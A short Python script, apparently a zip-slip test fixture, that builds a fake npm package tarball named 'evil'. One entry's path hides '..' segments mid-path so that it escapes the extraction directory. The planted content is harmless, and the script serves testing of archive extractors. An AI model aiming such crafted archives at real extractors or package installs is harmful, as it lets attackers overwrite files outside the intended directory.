import tarfile, io, os
out_path = "/tmp/zipslip-test/evil-normalize.tgz"
with tarfile.open(out_path, "w:gz") as tar:
    pkg_info = tarfile.TarInfo("package/package.json")
    pkg_content = b'{"version":"0.2.1","name":"evil"}'
    pkg_info.size = len(pkg_content)
    tar.addfile(pkg_info, io.BytesIO(pkg_content))
    # Path with embedded .. (not just leading) 
    evil = tarfile.TarInfo("package/foo/../../escape-target/embedded-pwn")
    evil_content = b"EMBEDDED\n"
    evil.size = len(evil_content)
    tar.addfile(evil, io.BytesIO(evil_content))
